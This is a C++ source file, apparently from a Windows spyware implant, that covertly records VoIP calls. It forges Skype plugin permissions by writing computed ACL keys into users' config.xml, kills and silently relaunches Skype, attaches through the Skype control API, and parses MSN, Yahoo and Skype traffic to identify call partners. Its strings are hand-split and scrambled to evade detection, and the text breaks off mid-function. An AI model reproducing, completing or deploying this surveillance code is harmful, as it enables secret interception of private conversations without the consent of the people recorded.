#include <Windows.h>
#include <json/JSON.h>
#include "common.h"
#include "bss.h"
#include "H4-DLL.h"
#include "process.h"
#include "HM_IpcModule.h"
#include "AM_Core.h"
#include "demo_functions.h"
#include "LOG.h"
#include <scramblestring.h>
#include "bin_string.h"
#include "HM_SkypeRecord.h"

speex_encoder_init_t rel_speex_encoder_init;
speex_encoder_ctl_t rel_speex_encoder_ctl;
speex_encoder_destroy_t rel_speex_encoder_destroy;
speex_encode_t rel_speex_encode;
speex_bits_init_t rel_speex_bits_init;
speex_bits_reset_t rel_speex_bits_reset;
speex_bits_write_t rel_speex_bits_write;
speex_bits_destroy_t rel_speex_bits_destroy;
speex_lib_get_mode_t rel_speex_lib_get_mode;

CRITICAL_SECTION skype_critic_sec;
partner_entry* call_list_head = NULL;
BOOL bPM_VoipRecordStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
DWORD sample_size[2] = { 0,0 };        // Viene inizializzato solo all'inizio
DWORD sample_channels[2] = { 1,1 };	 // Numero di canali
DWORD sample_sampling[2] = { SAMPLE_RATE_SKYPE_W, SAMPLE_RATE_SKYPE_W }; // Sample rate dei due canali per skype con wasapi
FILETIME channel_time_start[2];		 // Time stamp di inizio chiamata
FILETIME channel_time_last[2];       // Time stamp dell'ultimo campione
BYTE* wave_array[2] = { NULL, NULL };	 // Buffer contenenti i PCM dei due canali
DWORD max_sample_size = 500000; // Dimensione oltre la quale salva un sample su file
DWORD compress_factor = 5; // Fattore di compressione del codec
HMODULE codec_handle = NULL; // Handle alla dll del codec
BOOL bPM_spmcp = FALSE; // Semaforo per l'uscita del thread
HANDLE hSkypePMThread = NULL;

HWND skype_api_wnd = NULL;
HWND skype_pm_wnd = NULL;


char* GetXMLNodeA(char* data, char* node, char* buffer)
{
	char* ptr1, * ptr2, * ret_val;
	char saved_char;
	memset(buffer, 0, GENERIC_FIELD_LEN);
	if (data == NULL)
		return NULL;
	if (!(ptr1 = strstr(data, node)))
		return NULL;
	ret_val = ptr1;
	if (!(ptr1 = strchr(ptr1, L'>')))
		return NULL;
	if (!(ptr2 = strchr(ptr1, L'<')))
		return NULL;
	saved_char = *ptr2;
	ptr1++; *ptr2 = 0;
	strncpy_s(buffer, GENERIC_FIELD_LEN, ptr1, _TRUNCATE);
	*ptr2 = saved_char;
	return ret_val;
}


BOOL CalculateUserHash(WCHAR* user_name, WCHAR* file_path, char* m_key1, char* m_key2, char* m_key3, char* m_key4, char* m_key5, char* m_key6, char* m_path, BOOL isOld)
{
	char c_user_name[MAX_PATH];
	char c_file_path[MAX_PATH];

	sprintf_s(c_user_name, MAX_PATH, "%S", user_name);
	sprintf_s(c_file_path, MAX_PATH, "%S", file_path);

	ZeroMemory(m_key1, MAX_HASHKEY_LEN);
	ZeroMemory(m_key2, MAX_HASHKEY_LEN);
	ZeroMemory(m_key3, MAX_HASHKEY_LEN);
	ZeroMemory(m_key4, MAX_HASHKEY_LEN);
	ZeroMemory(m_key5, MAX_HASHKEY_LEN);
	ZeroMemory(m_key6, MAX_HASHKEY_LEN);
	ZeroMemory(m_path, MAX_HASHKEY_LEN);

	return SkypeACLKeyGen(c_user_name, c_file_path, m_key1, m_key2, m_key3, m_key4, m_key5, m_key6, m_path, isOld);
}

BOOL FindHashKeys(WCHAR* user_name, WCHAR* file_path, char* m_key1, char* m_key2, char* m_key3, char* m_key4, char* m_key5, char* m_key6, char* m_path, BOOL isOld)
{
	typedef struct {
		WCHAR user_name[MAX_PATH];
		char m_key1[MAX_HASHKEY_LEN];
		char m_key2[MAX_HASHKEY_LEN];
		char m_key3[MAX_HASHKEY_LEN];
		char m_key4[MAX_HASHKEY_LEN];
		char m_key5[MAX_HASHKEY_LEN];
		char m_key6[MAX_HASHKEY_LEN];
		char m_path[MAX_HASHKEY_LEN];
	} user_hash_struct;

	static user_hash_struct* user_hash_array_old = NULL;
	static DWORD user_hash_size_old = 0;
	static user_hash_struct* user_hash_array_new = NULL;
	static DWORD user_hash_size_new = 0;

	user_hash_struct* tmp_ptr = NULL;
	DWORD i;

	if (isOld) {
		for (i = 0; i < user_hash_size_old && user_hash_array_old; i++) {
			if (!wcscmp(user_hash_array_old[i].user_name, user_name)) {
				memcpy(m_key1, user_hash_array_old[i].m_key1, MAX_HASHKEY_LEN);
				memcpy(m_key2, user_hash_array_old[i].m_key2, MAX_HASHKEY_LEN);
				memcpy(m_key3, user_hash_array_old[i].m_key3, MAX_HASHKEY_LEN);
				memcpy(m_key4, user_hash_array_old[i].m_key4, MAX_HASHKEY_LEN);
				memcpy(m_key5, user_hash_array_old[i].m_key5, MAX_HASHKEY_LEN);
				memcpy(m_key6, user_hash_array_old[i].m_key6, MAX_HASHKEY_LEN);
				memcpy(m_path, user_hash_array_old[i].m_path, MAX_HASHKEY_LEN);
				return TRUE;
			}
		}
	}
	else {
		for (i = 0; i < user_hash_size_new && user_hash_array_new; i++) {
			if (!wcscmp(user_hash_array_new[i].user_name, user_name)) {
				memcpy(m_key1, user_hash_array_new[i].m_key1, MAX_HASHKEY_LEN);
				memcpy(m_key2, user_hash_array_new[i].m_key2, MAX_HASHKEY_LEN);
				memcpy(m_key3, user_hash_array_new[i].m_key3, MAX_HASHKEY_LEN);
				memcpy(m_key4, user_hash_array_new[i].m_key4, MAX_HASHKEY_LEN);
				memcpy(m_key5, user_hash_array_new[i].m_key5, MAX_HASHKEY_LEN);
				memcpy(m_key6, user_hash_array_new[i].m_key6, MAX_HASHKEY_LEN);
				memcpy(m_path, user_hash_array_new[i].m_path, MAX_HASHKEY_LEN);
				return TRUE;
			}
		}
	}

	if (!CalculateUserHash(user_name, file_path, m_key1, m_key2, m_key3, m_key4, m_key5, m_key6, m_path, isOld))
		return FALSE;

	if (isOld) {
		if (!(tmp_ptr = (user_hash_struct*)realloc(user_hash_array_old, (user_hash_size_old + 1) * sizeof(user_hash_struct))))
			return TRUE;
		user_hash_array_old = tmp_ptr;
		memcpy(user_hash_array_old[user_hash_size_old].user_name, user_name, sizeof(user_hash_array_old[user_hash_size_old].user_name));
		memcpy(user_hash_array_old[user_hash_size_old].m_key1, m_key1, sizeof(user_hash_array_old[user_hash_size_old].m_key1));
		memcpy(user_hash_array_old[user_hash_size_old].m_key2, m_key2, sizeof(user_hash_array_old[user_hash_size_old].m_key2));
		memcpy(user_hash_array_old[user_hash_size_old].m_key3, m_key3, sizeof(user_hash_array_old[user_hash_size_old].m_key3));
		memcpy(user_hash_array_old[user_hash_size_old].m_key4, m_key4, sizeof(user_hash_array_old[user_hash_size_old].m_key4));
		memcpy(user_hash_array_old[user_hash_size_old].m_key5, m_key5, sizeof(user_hash_array_old[user_hash_size_old].m_key5));
		memcpy(user_hash_array_old[user_hash_size_old].m_key6, m_key6, sizeof(user_hash_array_old[user_hash_size_old].m_key6));
		memcpy(user_hash_array_old[user_hash_size_old].m_path, m_path, sizeof(user_hash_array_old[user_hash_size_old].m_path));
		user_hash_size_old++;
	}
	else {
		if (!(tmp_ptr = (user_hash_struct*)realloc(user_hash_array_new, (user_hash_size_new + 1) * sizeof(user_hash_struct))))
			return TRUE;
		user_hash_array_new = tmp_ptr;
		memcpy(user_hash_array_new[user_hash_size_new].user_name, user_name, sizeof(user_hash_array_new[user_hash_size_new].user_name));
		memcpy(user_hash_array_new[user_hash_size_new].m_key1, m_key1, sizeof(user_hash_array_new[user_hash_size_new].m_key1));
		memcpy(user_hash_array_new[user_hash_size_new].m_key2, m_key2, sizeof(user_hash_array_new[user_hash_size_new].m_key2));
		memcpy(user_hash_array_new[user_hash_size_new].m_key3, m_key3, sizeof(user_hash_array_new[user_hash_size_new].m_key3));
		memcpy(user_hash_array_new[user_hash_size_new].m_key4, m_key4, sizeof(user_hash_array_new[user_hash_size_new].m_key4));
		memcpy(user_hash_array_new[user_hash_size_new].m_key5, m_key5, sizeof(user_hash_array_new[user_hash_size_new].m_key5));
		memcpy(user_hash_array_new[user_hash_size_new].m_key6, m_key6, sizeof(user_hash_array_new[user_hash_size_new].m_key6));
		memcpy(user_hash_array_new[user_hash_size_new].m_path, m_path, sizeof(user_hash_array_new[user_hash_size_new].m_path));
		user_hash_size_new++;
	}

	return TRUE;
}

void StartSkypeAsUser(char* skype_exe_path, STARTUPINFO* si, PROCESS_INFORMATION* pi)
{
	HANDLE hToken;
	if (hToken = GetMediumLevelToken()) {
		HM_CreateProcessAsUser(skype_exe_path, 0, si, pi, 0, hToken);
		CloseHandle(hToken);
	}
}

void SKypeNameConvert(WCHAR* path, WCHAR* user_name, DWORD size)
{
	WCHAR* ptr;
	DWORD len, first;

	ZeroMemory(user_name, size);
	_snwprintf_s(user_name, size / sizeof(WCHAR), _TRUNCATE, L"%s", path);
	ptr = wcsstr(user_name, L"#3a");
	if (!ptr)
		return;

	len = wcslen(user_name) * sizeof(WCHAR);
	first = (DWORD)ptr - (DWORD)user_name;
	*ptr = L':';

	memcpy(ptr + 1, ptr + 3, len - first - 4);
}

// Inserisce i permessi corretti per potersi attaccare a skype come plugin
void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR* skype_path)
{
	WCHAR skype_data[MAX_PATH];
	WCHAR skype_search[MAX_PATH];
	WCHAR config_path[MAX_PATH];
	WCHAR core_path[MAX_PATH];
	char skype_exe_path[MAX_PATH];
	WIN32_FIND_DATAW find_data;
	HANDLE hFind, hSkype, hFile;
	BOOL is_to_respawn = FALSE;
	char m_key1[MAX_HASHKEY_LEN], m_key2[MAX_HASHKEY_LEN], m_key3[MAX_HASHKEY_LEN], m_key4[MAX_HASHKEY_LEN], m_key5[MAX_HASHKEY_LEN], m_key6[MAX_HASHKEY_LEN], m_path[MAX_HASHKEY_LEN];
	BOOL isOld;
	WCHAR skype_user_name[MAX_PATH];

	// Trova il path di %appdata%\Skype
	if (!FNC(GetEnvironmentVariableW)(L"appdata", skype_data, MAX_PATH))
		return;
	wcscat_s(skype_data, MAX_PATH, L"\\Skype\\");
	_snwprintf_s(skype_search, sizeof(skype_search) / sizeof(WCHAR), _TRUNCATE, L"%s\\*", skype_data);
	_snprintf_s(skype_exe_path, sizeof(skype_exe_path), _TRUNCATE, "%S\\Phone\\Skype.exe /nosplash /minimized", skype_path);
	if (GetModuleFileNameW(NULL, core_path, MAX_PATH) == 0)
		return;

	// Cicla tutte le directory degli account
	hFind = FNC(FindFirstFileW)(skype_search, &find_data);
	if (hFind == INVALID_HANDLE_VALUE)
		return;
	do {
		if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (find_data.cFileName[0] == L'.')
				continue;
			// Verifica che sia realmente un utente
			_snwprintf_s(config_path, sizeof(config_path) / sizeof(WCHAR), _TRUNCATE, L"%s\\%s\\config.xml", skype_data, find_data.cFileName);
			if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
				continue;
			CloseHandle(hFile);
			// Verifica se contiene gia' la permission altrimenti la scrive
			isOld = IsOldSkypeVersion(config_path);
			SKypeNameConvert(find_data.cFileName, skype_user_name, sizeof(skype_user_name));
			if (FindHashKeys(skype_user_name, core_path, m_key1, m_key2, m_key3, m_key4, m_key5, m_key6, m_path, isOld))
				if (!IsACLPresent(config_path, m_key1, m_key2, m_key3, m_key4, m_path))
					if (WriteSkypeACL(config_path, m_key1, m_key2, m_key3, m_key4, m_key5, m_key6, m_path, isOld))
						is_to_respawn = TRUE;
		}
	} while (FNC(FindNextFileW)(hFind, &find_data));
	FNC(FindClose)(hFind);

	// Se ne scrive almeno una, killa e respawna skype
	if (is_to_respawn) {
		if (hSkype = FNC(OpenProcess)(PROCESS_TERMINATE, FALSE, skype_pid)) {
			STARTUPINFO si;
			PROCESS_INFORMATION pi;

			TerminateProcess(hSkype, 0);
			CloseHandle(hSkype);
			ZeroMemory(&si, sizeof(si));
			si.cb = sizeof(si);
			Sleep(1000); // Da' un po' di tempo per killare il processo
			//si.wShowWindow = SW_SHOW;
			//si.dwFlags = STARTF_USESHOWWINDOW;
			StartSkypeAsUser(skype_exe_path, &si, &pi);
		}
	}
}

// Monitora costantemente la possibilita' di attaccarsi come API client a Skype
DWORD WINAPI MonitorSkypePM(BOOL* semaphore)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	DWORD skipe_id;
	HANDLE skype_handle;
	WCHAR skype_path[MAX_PATH];
	WCHAR* skype_pm_ptr;
	WCHAR skype_pm_path[MAX_PATH];

	LOOP{
		for (DWORD i = 0; i < 9; i++) {
			CANCELLATION_POINT((*semaphore));
			Sleep(250);
		}

	// Cerca il path di skypepm partendo da quello di skype.exe
	// e lo esegue
	if ((skipe_id = HM_FindPid((char*)"skype.exe", TRUE))) {
		if ((skype_handle = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, skipe_id))) {
			if (FNC(GetModuleFileNameExW)(skype_handle, NULL, skype_path, (sizeof(skype_path) / sizeof(WCHAR)) - 1)) {
				if (skype_pm_ptr = wcsstr(skype_path, L"\\Phone\\")) {
					*skype_pm_ptr = 0;
					_snwprintf_s(skype_pm_path, sizeof(skype_pm_path) / sizeof(WCHAR), _TRUNCATE, L"%s\\Plugin Manager\\skypePM.exe", skype_path);
					// Vede se esiste il file
					HANDLE	fileh = FNC(CreateFileW)(skype_pm_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
					if (fileh != INVALID_HANDLE_VALUE)
						CloseHandle(fileh);
					else {// Non c'e' lo skypePM quindi cerca di fare l'attach al processo
						// Prima di cercare di fare l'attach controlla che ci siano i giusti permessi...
						EnterCriticalSection(&skype_critic_sec);
						CheckSkypePluginPermissions(skipe_id, skype_path);
						LeaveCriticalSection(&skype_critic_sec);
						UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
						HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL);
					}
				}
			}
			CloseHandle(skype_handle);
		}
	}
	}
	return 0;
}

BOOL ParseMsnMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags)
{
	char* ptr = NULL, * tmp = NULL, * MsnID = NULL;
	char space[] = { ' ', 0 };
	char separator[] = { ';', '{', 0 };

	if (*pdwFlags & FLAGS_MSN_OUT) {
		NullTerminatePacket(*pdwLen, msg);

		// Cerchiamo il primo spazio e spostiamoci avanti
		if (ptr = strstr((char*)msg, space))
			ptr++;
		else
			return TRUE;

		// Facciamo la stessa cosa col secondo spazio
		if (ptr && (ptr = strstr((char*)ptr, space)))
			ptr++;
		else
			return TRUE;

		// Terminiamo al terzo spazio
		if (ptr && (tmp = strstr((char*)ptr, space)))
			*tmp = 0;
		else
			return TRUE;

		if (ptr == NULL)
			return TRUE;

		MsnID = _strdup(ptr);
	}

	// Se ha trovato un nuovo interlocutore
	if (MsnID) {
		// Toglie l'uid
		ptr = strstr(MsnID, separator);
		if (ptr)
			*ptr = 0;

		if (call_list_head == NULL || call_list_head->peer == NULL || strcmp(call_list_head->peer, MsnID)) {
			EndCall();
			FreePartnerList(&call_list_head);
			// Alloca il nuovo interlocutore
			if ((call_list_head = (partner_entry*)calloc(sizeof(partner_entry), 1))) {
				call_list_head->peer = MsnID;
				call_list_head->voip_program = VOIP_MSMSG;
			}
		}
	}

	if ((*pdwFlags & FLAGS_MSN_IN) || (*pdwFlags & FLAGS_MSN_OUT))
		return TRUE;

	// Se e' una chiamata VOIP_MSMSG, ma riceve chunk da wasapi, la trasforma in VOIP_MSMSG per
	// far accettare i chunk
	if ((((*pdwFlags) >> 24) & 0x3F) == VOIP_MSNWS && call_list_head &&
		(call_list_head->voip_program == VOIP_MSMSG))
		call_list_head->voip_program = VOIP_MSNWS;

	return FALSE;
}

BOOL ParseGtalkMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags)
{
	char* ptr = NULL, * tmp_ptr = NULL;
	char* GTID = NULL;

	/*	if (*pdwFlags & FLAGS_GTALK_IN) {
			NullTerminatePacket(*pdwLen, msg);
			if ( (ptr = strchr((char *)msg, '>')) && !strncmp(++ptr, "<session ", strlen("<session ")) && (tmp_ptr = strchr(ptr, '>')) ) {
				*tmp_ptr = 0;
				// E' un pacchetto di accept per una chiamata iniziata da noi
				if ( strstr(ptr, "type=\"accept\"") && (ptr = strstr((char *)msg, "from=\"")) ) {
					ptr+=strlen("from=\"");
					if ( (tmp_ptr = strchr(ptr, '/')) )
						*tmp_ptr = 0;
					GTID = strdup(ptr);
				} else if ( strstr(ptr, "type=\"terminate\"") ) {
					// E' un pacchetto di terminate
					EndCall();
					FreePartnerList(&call_list_head);
				}
			}
		}

		if (*pdwFlags & FLAGS_GTALK_OUT) {
			NullTerminatePacket(*pdwLen, msg);
			// E' un pacchetto di accept per una chiamata iniziata da noi
			if ( (ptr = strchr((char *)msg, '>')) && !strncmp(++ptr, "<session ", strlen("<session ")) && (tmp_ptr = strchr(ptr, '>')) ) {
				*tmp_ptr = 0;
				if ( strstr(ptr, "type=\"accept\"") && (ptr = strstr((char *)msg, "to=\"")) ) {
					ptr+=strlen("to=\"");
					if ( (tmp_ptr = strchr(ptr, '/')) )
						*tmp_ptr = 0;
					GTID = strdup(ptr);
				} else if ( strstr(ptr, "type=\"terminate\"") ) {
					// E' un pacchetto di terminate
					EndCall();
					FreePartnerList(&call_list_head);
				}
			}
		}

		// Se ha trovato un nuovo interlocutore
		if (GTID) {
			EndCall();
			FreePartnerList(&call_list_head);
			// Alloca il nuovo interlocutore
			if ( (call_list_head = (partner_entry *)calloc(sizeof(partner_entry), 1)) )  {
				//Log_Sanitize(GTID);
				call_list_head->peer = GTID;
				call_list_head->voip_program = VOIP_GTALK;
			}
		}
		*/
	if ((*pdwFlags & FLAGS_GTALK_IN) || (*pdwFlags & FLAGS_GTALK_OUT))
		return TRUE;

	return FALSE;
}

BOOL ParseYahooMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags)
{
	char* ptr = NULL, * tmp = NULL;
	BOOL is_interesting = FALSE;
	char YID[64];
	char invite[10];
	DWORD seq = 0xfffffff;
	char sip_tag[] = { 'S', 'I', 'P', '/', '2', '.', '0', ' ', '2', '0', '0', ' ', 'O', 'K', 0x0 }; //"SIP/2.0 200 OK"
	char to_tag[] = { 'T', 'o', ':', ' ', 0x0 }; //"To: "
	char to_sip[] = { 'T', 'o', ':', ' ', '<', 's', 'i', 'p', ':', 0x0 }; //"To: <sip:"
	char to_sip_format[] = { 'T', 'o', ':', ' ', '<', 's', 'i', 'p', ':', '%', '6', '3', 's', 0x0 }; //"To: <sip:%63s"
	char minus_sip[] = { '<', 's', 'i', 'p', 0x0 }; //"<sip"
	char from_tag[] = { 'F', 'r', 'o', 'm', ':', ' ', 0x0 }; //"From: "
	char from_sip[] = { 'F', 'r', 'o', 'm', ':', ' ', '<', 's', 'i', 'p', ':', 0x0 }; //"From: <sip:"
	char from_sip_format[] = { 'F', 'r', 'o', 'm', ':', ' ', '<', 's', 'i', 'p', ':', '%', '6', '3', 's', 0x0 }; //"From: <sip:%63s"
	char call_id_tag[] = { 'C', 'a', 'l', 'l', '-', 'I', 'D', ':', ' ', 0x0 }; //"Call-ID: "
	char call_seq_tag[] = { 'C', 'S', 'e', 'q', ':', ' ', 0x0 }; //"CSeq: "

	char to_format[] = { 'T', 'o', ':', ' ', '%', '6', '3', 's', 0x0 }; //"To: %63s"
	char from_format[] = { 'F', 'r', 'o', 'm', ':', ' ', '%', '6', '3', 's', 0x0 }; //"From: %63s"

	if (*pdwFlags & FLAGS_YMSG_IN) {
		// Nuova chiamata
		NullTerminatePacket(*pdwLen, msg);
		if (ptr = strstr((char*)msg, sip_tag)) {
			if (ptr = strstr(ptr, to_tag)) {
				ZeroMemory(YID, sizeof(YID));
				// Cerca il nome del peer se la chiamata e' iniziata da locale
				if (!strncmp(ptr, to_sip, strlen(to_sip))) {
					sscanf(ptr, to_sip_format, YID);
					if (tmp = strstr(YID, "@"))
						tmp[0] = 0;
				}
				else {
					sscanf(ptr, to_format, YID);
					if (tmp = strstr(YID, minus_sip))
						tmp[0] = 0;
				}
				is_interesting = TRUE;
			}
		}
	}

	if (*pdwFlags & FLAGS_YMSG_OUT) {
		// Nuova chiamata
		NullTerminatePacket(*pdwLen, msg);
		if (ptr = strstr((char*)msg, sip_tag)) {
			if (ptr = strstr(ptr, from_tag)) {
				ZeroMemory(YID, sizeof(YID));
				// Cerca il nome del peer se la chiamata e' iniziata da remoto
				if (!strncmp(ptr, from_sip, strlen(from_sip))) {
					sscanf(ptr, from_sip_format, YID);
					if (tmp = strstr(YID, "@"))
						tmp[0] = 0;
				}
				else {
					sscanf(ptr, from_format, YID);
					if (tmp = strstr(YID, minus_sip))
						tmp[0] = 0;
				}
				is_interesting = TRUE;
			}
		}
	}

	// Qui abbiamo gia' parsato l'eventuale destinatario del messaggio
	// Ora vediamo se e' un inizio o fine chiamata. Se non trova il destinatario
	// questa parte non e' "interesting"
	if (is_interesting && ptr) {
		if (strstr(ptr, call_id_tag) && (ptr = strstr((char*)msg, call_seq_tag))) {
			sscanf(ptr, "CSeq: %d %6s", &seq, invite);
			// Comincia la registrazione se e' una nuova chiamata o se e' stato fatto il resume di una
			// chiamata messa precedentemente in hold
			if (!strncmp(invite, "INVITE", 6) && (strstr(ptr, "a=sendrecv") || strstr(ptr, "s=Yahoo Voice")) && seq != 0xfffffff) {
				// flusha la chiamata e libera la lista degli interlocutori 
				// (in questo caso e' uno soltanto).
				EndCall();
				FreePartnerList(&call_list_head);

				// Alloca il nuovo interlocutore
				if (!(call_list_head = (partner_entry*)calloc(sizeof(partner_entry), 1)))
					return TRUE;
				//Log_Sanitize(YID);
				call_list_head->peer = _strdup(YID);
				call_list_head->voip_program = VOIP_YAHOO;

				// Termina la chiamata 
			}
			else if (!strncmp(invite, "BYE", 3) && seq != 0xffffffff) {
				// flusha la chiamata e libera la lista degli interlocutori 
				// (in questo caso e' uno soltanto).
				EndCall();
				FreePartnerList(&call_list_head);
			}
		}
	}

	if ((*pdwFlags & FLAGS_YMSG_IN) || (*pdwFlags & FLAGS_YMSG_OUT))
		return TRUE;

	return FALSE;
}

BOOL ParseSkypeMsg(BYTE* msg, DWORD* pdwLen, DWORD* pdwFlags)
{
	COPYDATASTRUCT cd_struct;
	DWORD call_id;
	char req_buf[256];

	char id_num[] = { '#', '1', '4', '1', '1', '3', '0', '0', '9', 0x0 }; //"#14113009"
	char partner_h_id[] = { '#', '1', '4', '1', '1', '3', '0', '0', '9', ' ', 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'P', 'A', 'R', 'T', 'N', 'E', 'R', '_', 'H', 'A', 'N', 'D', 'L', 'E', ' ', '%', 's', 0x0 }; //"#14113009 CALL %d PARTNER_HANDLE %s"
	char id_local_hold[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'L', 'O', 'C', 'A', 'L', 'H', 'O', 'L', 'D', 0x0 }; //"STATUS LOCALHOLD"
	char id_remotehold[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'R', 'E', 'M', 'O', 'T', 'E', 'H', 'O', 'L', 'D', 0x0 }; //"STATUS REMOTEHOLD"
	char id_finished[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'F', 'I', 'N', 'I', 'S', 'H', 'E', 'D', 0x0 }; //"STATUS FINISHED"

	char id_unplaced[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'U', 'N', 'P', 'L', 'A', 'C', 'E', 'D', 0x0 }; //"STATUS INPROGRESS"
	char id_unplaced_format[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'U', 'N', 'P', 'L', 'A', 'C', 'E', 'D', 0x0 }; //"CALL %d STATUS INPROGRESS"

	char id_ringing[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'R', 'I', 'N', 'G', 'I', 'N', 'G', 0x0 }; //"STATUS INPROGRESS"
	char id_ringing_format[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'R', 'I', 'N', 'G', 'I', 'N', 'G', 0x0 }; //"CALL %d STATUS INPROGRESS"

	char id_partic_count[] = { 'C', 'O', 'N', 'F', '_', 'P', 'A', 'R', 'T', 'I', 'C', 'I', 'P', 'A', 'N', 'T', 'S', '_', 'C', 'O', 'U', 'N', 'T', 0x0 }; //"CONF_PARTICIPANTS_COUNT"
	char format_partner_handle[] = { '#', '1', '4', '1', '1', '3', '0', '0', '9', ' ', 'G', 'E', 'T', ' ', 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'P', 'A', 'R', 'T', 'N', 'E', 'R', '_', 'H', 'A', 'N', 'D', 'L', 'E', 0x0 }; //"#14113009 GET CALL %d PARTNER_HANDLE"
	char format_conf_part[] = { 'G', 'E', 'T', ' ', 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'C', 'O', 'N', 'F', '_', 'P', 'A', 'R', 'T', 'I', 'C', 'I', 'P', 'A', 'N', 'T', 'S', '_', 'C', 'O', 'U', 'N', 'T', 0x0 }; //"GET CALL %d CONF_PARTICIPANTS_COUNT"
	char format_call_stat[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'S', 'T', 'A', 'T', 'U', 'S', ' ', '%', 's', 0x0 }; //"CALL %d STATUS %s"
	char format_call_part[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'C', 'O', 'N', 'F', '_', 'P', 'A', 'R', 'T', 'I', 'C', 'I', 'P', 'A', 'N', 'T', 'S', '_', 'C', 'O', 'U', 'N', 'T', ' ', '%', 'd', 0x0 }; //"CALL %d CONF_PARTICIPANTS_COUNT %d"

	char string_obfs[] = { '_', ' ', 'O', 'E', 'P', 'U', 'v', 'E', 't', 'U', 'P', 'C', ' ', 'X', 'Q', 'y', 'c', ' ', 'H', 'd', 'l', 'd', 'l', '1', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', 'Q', 'M', 0x0d, 0x0a, 0x0 }; // "_ OEPUvEtUPC XQyc Hdldl1.............QM\r\n"

	if (*pdwFlags & FLAGS_SKAPI_MSG) {

		NullTerminatePacket(*pdwLen, msg);
		if (!strncmp((char*)msg, id_num, 9)) {

			// Skype ha risposto alle nostre richieste dicendo chi e' l'interlocutore
			// per questa chiamata
			partner_entry* curr_partner;
			char* partner_handle;

			if (!(partner_handle = (char*)calloc(strlen((char*)msg), sizeof(char))))
				return TRUE;
			sscanf((char*)msg, partner_h_id, &call_id, partner_handle);
			//Log_Sanitize(partner_handle);

			// vede se abbiamo gia' in lista questa chiamata
			for (curr_partner = call_list_head; curr_partner; curr_partner = curr_partner->next)
				if (curr_partner->Id == call_id) {
					SAFE_FREE(partner_handle);
					return TRUE;
				}

			// Se nella lista c'e' un interlocutore non Skype, azzera la lista
			for (curr_partner = call_list_head; curr_partner; curr_partner = curr_partner->next)
				if (curr_partner->voip_program != VOIP_SKYPE && curr_partner->voip_program != VOIP_SKWSA) {
					FreePartnerList(&call_list_head);
					break;
				}

			// Se non e' presente lo inseriamo in testa
			if (!(curr_partner = (partner_entry*)malloc(sizeof(partner_entry)))) {
				SAFE_FREE(partner_handle);
				return TRUE;
			}

			EndCall(); // E' cambiata la lista degli interlocutori, quindi
					   // forza il salvataggio della chiamata
			curr_partner->next = call_list_head;
			curr_partner->Id = call_id;
			curr_partner->participants = 0;
			curr_partner->peer = partner_handle;
			curr_partner->flags = 0;
			curr_partner->voip_program = VOIP_SKYPE;
			call_list_head = curr_partner;
		}
		else if (strstr((char*)msg, id_unplaced) && skype_api_wnd) {
			DWORD dummy;

			// Riceve l'avviso di chiamata in progress e richiede chi e' l'interlocutore
			sscanf((char*)msg, id_unplaced_format, &call_id);
			sprintf(req_buf, format_partner_handle, call_id);
			cd_struct.dwData = 0;
			cd_struct.lpData = req_buf;
			cd_struct.cbData = strlen((char*)cd_struct.lpData) + 1;
			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
			// e chiede anche quanti sono a partecipare alla chiamata (in remoto)
			sprintf(req_buf, format_conf_part, call_id);
			cd_struct.dwData = 0;
			cd_struct.lpData = req_buf;
			cd_struct.cbData = strlen((char*)cd_struct.lpData) + 1;
			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);

			// Termina ogni chiamata esistente 
			EndCall();
			FreePartnerList(&call_list_head);

		}
		else if (strstr((char*)msg, id_ringing) && skype_api_wnd) {
			DWORD dummy;

			// Riceve l'avviso di chiamata in progress e richiede chi e' l'interlocutore
			sscanf((char*)msg, id_ringing_format, &call_id);
			sprintf(req_buf, format_partner_handle, call_id);
			cd_struct.dwData = 0;
			cd_struct.lpData = req_buf;
			cd_struct.cbData = strlen((char*)cd_struct.lpData) + 1;
			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
			// e chiede anche quanti sono a partecipare alla chiamata (in remoto)
			sprintf(req_buf, format_conf_part, call_id);
			cd_struct.dwData = 0;
			cd_struct.lpData = req_buf;
			cd_struct.cbData = strlen((char*)cd_struct.lpData) + 1;
			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);

